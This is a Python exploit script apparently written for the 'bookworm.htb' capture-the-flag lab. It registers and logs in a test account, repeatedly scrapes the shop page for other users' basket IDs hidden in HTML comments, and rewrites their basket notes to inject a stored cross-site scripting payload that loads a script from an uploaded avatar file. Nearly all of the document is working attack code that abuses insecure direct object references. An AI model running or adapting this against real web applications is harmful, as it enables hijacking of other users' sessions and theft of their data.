#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup, Comment
import re
import time
import sys 

S = requests.Session()
AVATAR_PATH = 'http://bookworm.htb/static/img/uploads/17'

def register():
    data = {
        'name': 'test',
        'username': 'test',
        'password': 'test',
        'addressLine1': 'test',
        'addressLine2': 'test',
        'town': 'test',
        'postcode': '123',
    }
    requests.post('http://bookworm.htb/register', data=data, verify=False)

def login():
    data = {
        'username': 'test',
        'password': 'test',
    }
    S.post('http://bookworm.htb/login', data=data, verify=False)

def edit_note(name, number):
    print(f'Edit note {number} for user {name}')
    data = {
        'quantity': '1',
        'note': f'<script src="{AVATAR_PATH}"></script>'
    }

    S.post(f'http://bookworm.htb/basket/{number}/edit', data=data, verify=False)

def recent_updates():
    try:
        while True:
            text = ''
            r = S.get('http://bookworm.htb/shop', verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            for entry in soup.find_all("div", class_="row mb-2"):
                comment = entry.find(string=lambda text: isinstance(text, Comment))
                number = re.search(r'\d+', comment).group() if comment else None
                name_tag = entry.find('strong')
                name = name_tag.get_text(strip=True) if name_tag else None
                text_entry = f'{name} : {number} | '
                text += text_entry
                print(text)
                edit_note(name, number)
            time.sleep(10)
    except KeyboardInterrupt:
        print('\nExit')

register()
login()
recent_updates()
